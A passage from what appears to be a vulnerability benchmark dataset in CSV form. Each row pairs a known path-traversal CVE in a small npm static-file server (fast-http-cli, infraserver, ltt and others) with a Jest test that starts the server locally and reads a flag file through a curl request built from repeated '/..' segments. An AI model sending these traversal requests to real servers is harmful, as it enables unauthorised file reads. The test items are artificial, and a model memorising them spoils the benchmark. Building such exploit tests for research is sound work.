  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverwzl/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverwzl:20170511; https://github.com/advisories/GHSA-g87g-4x3w-f8jp
path-traversal,CVE-2017-16155,fast-http-cli,0.0.8,n/a,path-traversal/fast-http-cli_0.0.8,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8892/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http-cli"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8892/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fast-http-cli/fast-http.js -p 8892"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8892${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:16,https://security.snyk.io/vuln/npm:fast-http-cli:20170418; https://github.com/advisories/GHSA-9frq-f867-hgqc
path-traversal,CVE-2017-16142,infraserver,0.0.1,n/a,path-traversal/infraserver_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 46372/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in infraserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 46372/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/infraserver/Infra.data.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:46372${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,Infra.data.js:137:9,https://security.snyk.io/vuln/npm:infraserver:20170518; https://github.com/advisories/GHSA-v464-rcx7-j875
path-traversal,,xxf11,1.0.1,n/a,path-traversal/xxf11_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8890/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xxf11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8890/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xxf11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8890${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:xxf11:20170730; 
path-traversal,,express-blinker,0.0.6,n/a,path-traversal/express-blinker_0.0.6,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in express-blinker"", (done) => {
  expect.assertions(1);
  const express = require(""express"");
  let app = express();
  const pkg = require(""express-blinker"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8893/tcp"", () => {});
  } catch (e) {}
  app.use(
    pkg(__dirname, [
      {
        test: /.*/,
        etag: true,
        lastModified: false,
        cacheControl: true,
        expires: false,
        age: 600,
      },
    ])
  );
  app.listen(8893);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8893${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:181:28,https://security.snyk.io/vuln/npm:express-blinker:20180226; 
path-traversal,,gyfserver,1.0.0,n/a,path-traversal/gyfserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gyfserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gyfserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:gyfserver:20180315; 
path-traversal,,run-this-place,1.0.2,n/a,path-traversal/run-this-place_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in run-this-place"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/run-this-place/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:53:37,https://security.snyk.io/vuln/npm:run-this-place:20170508; 
path-traversal,CVE-2017-16212,ltt,1.1.0,n/a,path-traversal/ltt_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ltt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ltt/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:ltt:20170503; https://github.com/advisories/GHSA-5jg5-w395-9684
path-traversal,,wenluhong1,1.0.0,n/a,path-traversal/wenluhong1_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong1/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong1:20170509; https://github.com/advisories/GHSA-224h-p7p5-rh85
